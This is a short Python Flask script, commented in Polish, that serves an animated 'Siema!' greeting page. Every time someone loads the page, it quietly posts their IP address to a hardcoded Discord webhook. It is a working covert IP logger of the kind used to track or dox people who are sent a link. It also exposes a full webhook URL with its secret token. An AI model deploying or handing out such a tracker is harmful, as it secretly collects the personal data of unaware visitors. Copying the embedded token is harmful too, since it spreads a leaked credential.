#!/usr/bin/env python3
import subprocess
import sys
import os

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg], stdout=subprocess.DEVNULL)

# Upewnij się, że Flask i requests są zainstalowane
try:
    from flask import Flask, render_template_string, request
except ImportError:
    print("Flask nie znaleziony – instaluję…")
    install("flask")
    from flask import Flask, render_template_string, request

try:
    import requests
except ImportError:
    print("requests nie znaleziony – instaluję…")
    install("requests")
    import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1340672206266568765/12pQ2cmefEuykpwQwSUed-YIsloEO6fRbpn4FXpAYjk19MqXtHCK-y69yRGZqrut2Clr"

HTML = """
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Animacja Siema!</title>
    <style>
        body {
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0; background: #222;
        }
        h1 {
            font-family: 'Arial', sans-serif; font-size: 5rem;
            color: #fff; text-transform: uppercase;
            animation: glow 1.5s ease-in-out infinite alternate,
                       scale 1.5s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 10px #0f0; }
            to   { text-shadow: 0 0 20px #0f0, 0 0 30px #0f0; }
        }
        @keyframes scale {
            from { transform: scale(1); }
            to   { transform: scale(1.1); }
        }
    </style>
</head>
<body>
    <h1>Siema!</h1>
</body>
</html>
"""

def send_discord_embed(ip_address):
    embed = {
        "embeds": [
            {
                "title": "Nowa wizyta na stronie",
                "description": f"Strona została odwiedzona przez IP: `{ip_address}`",
                "color": 4838850,  # zielony odcień
            }
        ]
    }
    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except Exception as e:
        # opcjonalnie: logowanie błędu
        print(f"Nie udało się wysłać embed: {e}", file=sys.stderr)

@app.route("/")
def home():
    # Pobieramy IP klienta
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    # Wysyłamy embed do Discorda
    send_discord_embed(ip)
    return render_template_string(HTML)

if __name__ == "__main__":
    # Pobierz port z env (Render.com ustawia zmienną PORT), domyślnie 5000
    port = int(os.getenv("PORT", "5000"))
    app.run(host="0.0.0.0", port=port)
